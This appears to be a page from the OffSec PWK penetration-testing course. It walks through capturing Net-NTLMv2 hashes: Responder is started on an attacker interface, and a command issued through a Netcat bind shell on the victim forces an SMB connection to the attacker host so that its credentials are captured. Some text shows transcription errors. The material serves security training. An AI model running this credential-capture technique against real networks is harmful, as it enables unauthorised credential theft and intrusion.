# OffSec

Penetration Testing with Kali Linux

privileged raw socket operations for the various protocols. We'll set the listening interface with -l, noting that your interface may differ from what's shown here.

```
kali@kali:-$ ip a

3: tap0:<BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc codel state UNKNOWN
default qlen 1000
link/ether 42:11:48:1b:55:18 br ff:ff:ff:ff:ff:ff
inet 192.168.119.2/24 global tap0
valid_lft forever preferred forever
inet6 fe80::4011:48ff:fe58/64 scope link
valid_lft forever preferred forever
```

```
kali@kali:-$ sudo responder -I tap0
```

![](bbox=[0.118, 0.313, 0.615, 0.363])

NBT-NS, LLMNR & MDNS Responder 3.1.1.0

Author: Laurent Gaffe (laurent.gaffie@gmail.com)
to kill this script hit CTRL-C

```
HTTP server [ON]
HTTPS server [ON]
WPAD proxy [OFF]
Auth proxy [OFF]
SMB server [ON]
```

+   [+] Listening for events...

Listing 301 - Starting Responder on interface tap0

The output shows that Responder is listening for events and the SMB server is active.

Our next step is to access to a non-existent SMB share on our Responder SMB using paul's bind shell. We will do this with a simple dir listing of \\192.168.119.2\test, which "test" is an arbitrary directory name. We are only interested in the authentication process, not a share listing.

Let's switch back to the terminal tab connecting Netcat bind process, and enter the command.

```
C:\Windows\system32>dir \\192.168.119.2\test
dir \192.168.119.2\test
Access denied.
```

Listing 302 - Using the dir command to create an SMB connection to the Kali machine

The Responder tool should show the following:

+   [+] Listening for events...
[SMB] NTLv2-SSP Client : ffff:192.168.119.50.221
[SMB] NTLv2-SSP Username : FILES01@paul
[SMB] NTLv2-SSP Hash :

PWK - Copyright © 2023 OffSecServices Limited. All rights reserved.

422